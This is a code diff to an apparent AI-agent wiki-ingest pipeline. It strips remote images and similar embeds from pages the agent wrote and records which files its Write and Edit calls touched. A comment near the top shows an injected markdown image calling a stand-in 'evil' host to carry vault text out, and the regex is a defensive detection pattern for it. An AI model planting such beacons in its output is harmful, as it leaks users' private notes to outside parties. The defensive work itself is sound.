@@ -440,24 +440,48 @@ def verify_ingest(source_paths):
 
 # A remote image is a beacon: Obsidian fetches it when the page renders, so an injected
 # ![](https://evil/?d=<vault text>) would ship whatever the child read. Local embeds stay.
-REMOTE_IMAGE = re.compile(r"!\[[^\]\n]*\]\(\s*<?(?:https?:)?//[^)\n]*\)"
-                          r"|<img\b[^>]*?\bsrc\s*=\s*[\"']?\s*(?:https?:)?//[^>]*>", re.I)
+# "Remote" is any target that isn't a plain relative path: a scheme, //host, or an &# entity.
+_REMOTE = r"(?:[a-z][\w+.-]*:|//|&#)"
+REMOTE_IMAGE = re.compile(
+    r"!\[[^\]]*\]\([^)]*?" + _REMOTE + r"[^)]*\)"                            # ![alt, may span lines](target)
+    r"|^ {0,3}\[[^\]\n]+\]:[ \t]*<?\S*?" + _REMOTE + r".*$\n?"               # [label]: target, used by ![x][label]
+    r"|<(?:img|iframe|video|audio|source|embed)\b[^>]*?\b(?:src|srcset)\s*=\s*[\"']?[^\"'>]*?"
+    r"(?:https?:|//|&#)[^>]*>",
+    re.I | re.M)
+FENCE = re.compile(r"^(```|~~~).*?(?:^\1[^\n]*$|\Z)", re.M | re.S)
 
 
-def strip_remote_images(since):
-    """Remove remote images from wiki pages modified at or after `since` (epoch seconds),
-    naming each file it changed. Never fails the run: the ingest itself may still be good."""
-    for f in (VAULT / "wiki").rglob("*.md"):
+def strip_remote_images(paths):
+    """Remove remote images from the pages the child wrote (paths relative to the vault or
+    absolute), outside fenced code, naming each file it changed. Never fails the run."""
+    for p in sorted(set(paths)):
+        f = Path(p) if Path(p).is_absolute() else VAULT / p
         try:
-            if f.stat().st_mtime < since:
-                continue
             text = f.read_text(encoding="utf-8")
-            clean, n = REMOTE_IMAGE.subn("", text)
-            if n:
-                f.write_text(clean, encoding="utf-8")
-                log(f"  stripped {n} remote image(s) from {f.relative_to(VAULT)}")
+            parts, n, last = [], 0, 0
+            for m in FENCE.finditer(text):  # code fences are kept verbatim
+                clean, k = REMOTE_IMAGE.subn("", text[last:m.start()])
+                parts += [clean, m.group()]
+                n, last = n + k, m.end()
+            clean, k = REMOTE_IMAGE.subn("", text[last:])
+            if n + k:
+                f.write_text("".join(parts) + clean, encoding="utf-8")
+                log(f"  stripped {n + k} remote image(s) from {f}")
         except (OSError, UnicodeDecodeError) as e:
             log(f"  image check skipped {f}: {e}")
+
+
+def written_paths(line):
+    """file_path of every Write/Edit call in one stream-json event line."""
+    if '"tool_use"' not in line:
+        return []
+    try:
+        content = json.loads(line).get("message", {}).get("content") or []
+    except (ValueError, AttributeError):
+        return []
+    return [c["input"]["file_path"] for c in content
+            if isinstance(c, dict) and c.get("type") == "tool_use" and c.get("name") in ("Write", "Edit", "MultiEdit")
+            and isinstance(c.get("input"), dict) and isinstance(c["input"].get("file_path"), str)]
 
 
 _SYSTEM_PROMPT_FILE = None
@@ -526,7 +550,6 @@ def ingest_to_wiki(source_paths, extra=""):
     LOG_DIR.mkdir(parents=True, exist_ok=True)
     logfile = LOG_DIR / f"ingest-{datetime.now().strftime('%Y%m%d-%H%M%S')}.log"
     log_before_mtime = WIKI_LOG.stat().st_mtime if WIKI_LOG.exists() else 0
-    started = datetime.now().timestamp() - 1  # ponytail: 1 s slack for coarse filesystem mtimes
     now_iso = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
     prompt = (
         f"Every page you create or update includes generated: {{by: fathom-pipeline, at: {now_iso}}} "
@@ -561,10 +584,11 @@ def ingest_to_wiki(source_paths, extra=""):
     timed_out = threading.Event()
     watchdog = threading.Timer(2400, lambda: (timed_out.set(), proc.kill()))
     watchdog.start()
-    auth_failed = False
+    auth_failed, written = False, []
     with open(logfile, "w") as f:
         for line in proc.stdout:
             line = line.rstrip()
+            written += written_paths(line)
             if '"error":"authentication_failed"' in line:
                 auth_failed = True
             # The final result line carries the real error text. Truncating it hid an expired
@@ -574,7 +598,7 @@ def ingest_to_wiki(source_paths, extra=""):
             f.flush()
     returncode = proc.wait()
     watchdog.cancel()
-    strip_remote_images(started)  # whatever the outcome: a failed run can still have written pages
+    strip_remote_images(written)  # whatever the outcome: a failed run can still have written pages
     if auth_failed:
         # The CLI can exit 0 on an auth-failed result, and its wording ("OAuth session expired and
         # could not be refreshed") matches none of AUTH_ERRORS, so report this explicitly instead
